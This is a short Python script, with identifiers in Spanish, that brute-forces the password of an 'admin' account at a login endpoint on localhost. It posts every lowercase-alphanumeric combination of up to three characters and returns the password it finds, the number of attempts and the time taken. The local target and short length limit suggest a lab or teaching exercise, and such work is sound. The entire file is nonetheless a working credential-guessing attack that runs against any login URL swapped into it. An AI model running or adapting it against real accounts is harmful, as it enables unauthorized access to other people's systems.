import requests
import itertools
import string
import time

URL = "http://127.0.0.1:8000/login"
USERNAME = "admin"
ALFABETO = string.ascii_lowercase + string.digits
MAX_LEN = 3 

def ataque_fuerza_bruta():
    intentos = 0
    inicio = time.time()


    sesion = requests.Session()

    for longitud in range(1, MAX_LEN + 1):
        for combinacion in itertools.product(ALFABETO, repeat=longitud):
            password = "".join(combinacion)
            intentos += 1


            if intentos % 500 == 0:
                print(f"Probando intento {intentos}: {password}", end="\r")

            try:
                respuesta = sesion.post(
                    URL,
                    json={"username": USERNAME, "password": password},
                    timeout=5,
                )
            except requests.exceptions.RequestException as e:
                return {
                    "error": "No se pudo conectar con la API",
                    "detalle": str(e),
                    "intentos": intentos,
                }

   
            content_type = respuesta.headers.get("content-type", "")
            if respuesta.status_code == 200 and "application/json" in content_type:
                try:
                    data = respuesta.json()
                except ValueError:

                    continue
                if data.get("message") == "Login exitoso" or data.get("status") == "success":
                    tiempo_total = time.time() - inicio
                    return {
                        "clave": password,
                        "intentos": intentos,
                        "tiempo_s": round(tiempo_total, 6),
                    }


            if respuesta.status_code not in (200, 401):
                print(f"Respuesta inesperada {respuesta.status_code} para '{password}'")

    tiempo_total = time.time() - inicio
    return {"clave": None, "intentos": intentos, "tiempo_s": round(tiempo_total, 6)}


if __name__ == "__main__":
    resultado = ataque_fuerza_bruta()
    print("\nResultado del ataque:")
    print(resultado)